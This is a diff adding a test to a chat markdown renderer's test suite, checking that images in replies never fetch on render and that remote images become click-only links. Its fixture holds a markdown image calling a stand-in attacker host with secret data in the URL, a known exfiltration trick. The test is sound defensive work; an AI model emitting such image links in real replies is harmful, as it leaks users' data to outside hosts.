@@ -63,6 +63,28 @@ describe('ChatProse', () => {
     });
   });
 
+  test('remote images never load', async () => {
+    const markdown = 'Here ![secret notes](https://evil.example/p.png?d=SECRET) and ![](data:image/png;base64,AAAA) and ![logo](/api/files/f1).';
+    const view = dom(markdown);
+    const live = mount(<ChatProse text={markdown} streaming citationDriveId="d1" />);
+    await vi.waitFor(async () => {
+      await act(async () => {});
+      if (!live.textContent?.includes('secret notes')) throw new Error('not rendered');
+    });
+    const link = view.querySelector('a[href="https://evil.example/p.png?d=SECRET"]');
+    assert({
+      given: 'a reply embedding a remote image whose URL carries data, a data: image and a same-origin image, finished and streaming',
+      should: 'create no image and nothing that fetches on render; a web image becomes a link the viewer must click, the rest only their alt text',
+      actual: [
+        [view.querySelector('img'), view.querySelector('[src], [srcset]'), live.querySelector('img'), live.querySelector('[src], [srcset]')],
+        [link?.textContent, link?.getAttribute('target'), link?.getAttribute('rel'), link?.className],
+        view.textContent?.includes('logo'),
+        view.querySelectorAll('a').length,
+      ],
+      expected: [[null, null, null, null], ['secret notes', '_blank', 'noopener noreferrer', proseClasses.a], true, 1],
+    });
+  });
+
   test('page citations', () => {
     const view = dom('See @[Roadmap](p1:page) and ask @[Ada](u1:user).');
     const chip = view.querySelector('a[data-citation]');
